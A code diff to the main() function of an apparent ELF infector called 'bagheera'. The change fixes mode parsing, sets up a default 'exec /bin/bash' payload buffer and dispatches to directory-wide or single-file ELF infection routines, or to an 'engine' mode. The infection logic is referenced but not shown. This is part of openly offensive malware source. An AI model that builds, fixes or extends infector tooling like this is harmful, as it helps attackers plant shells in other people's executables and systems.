@@ -1,9 +1,9 @@
-#include "src/bagheera.hpp"
 #include "src/includes.hpp"
 #include "src/definitions.h"
 #include "src/helpers.h"
-#include "engine.h"
-#include "infect.h"
+#include "src/engine.h"
+#include "src/infect.h"
+#include "src/bagheera.hpp"
 
 extern int errno;
 extern char *optarg;
@@ -12,13 +12,18 @@ extern int opterr, optind;
 int main(int argc, char *argv[])
 {
 
-    int opt, input_fd, input_size;
+    int opt, input_fd;
     opterr = 0;
+
+    int payloadsz = default_payload_size();
+    char *default_payload = (char *) malloc(payloadsz);
+    write_default_payload(default_payload);
+
     
     options_t options = { 0,                       // verbose - default: no verbose                    
                           0,                       // mode - mandatory                                  
-                          default_payload(),       // input - default: 'exec /bin/bash' payload        
-                          default_payload_size(),  // inputsz - default: 'exec /bin/bash' payload size 
+                          default_payload,       // input - default: 'exec /bin/bash' payload        
+                          payloadsz,  // inputsz - default: 'exec /bin/bash' payload size 
                           1,                       // output - default: stdout                          
                           -1,                      // elf - default: no file                           
                           NULL };                  // dir - default: no dir                            
@@ -28,10 +33,10 @@ int main(int argc, char *argv[])
       switch(opt) {
     
         case 'm':
-          if (strcmp(optarg, ENGINE))
+          if ( !strcmp(optarg, ENGINE) )
             options.mode = MODE_ENGINE;
     
-          else if (strcmp(optarg, INFECT))
+          else if ( !strcmp(optarg, INFECT) )
             options.mode = MODE_INFECT;
           
           else
@@ -99,18 +104,21 @@ int main(int argc, char *argv[])
     if ( !options.mode )
       error(ERR_MODE);
 
-    if (options.mode == MODE_INFECT)
+    if ( options.mode == MODE_INFECT)
     {
-      if (options.elf == -1 && options.dir != NULL)
-        directory_infection(&options);      
-      else if (options.elf != -1 && options.dir == NULL)  
-        elf_infection(&options);
-      else
-        error(ERR_MODE_INFECT_OPTIONS);
+        if (options.verbose) printf("%s: starting bagheera in infect mode\n", INFO_BANNER );
+
+        if (options.elf == -1 && options.dir != NULL)
+            directory_infection(&options);      
+        else if (options.elf != -1 && options.dir == NULL)  
+            elf_infection(&options);
+        else
+            error(ERR_MODE_INFECT_OPTIONS);
     }
     else 
     {
-      engine_execution(&options);
+        if (options.verbose) printf("%s: starting bagheera in engine mode\n", INFO_BANNER );
+        engine_execution(&options);
     }
 
     return EXIT_SUCCESS;
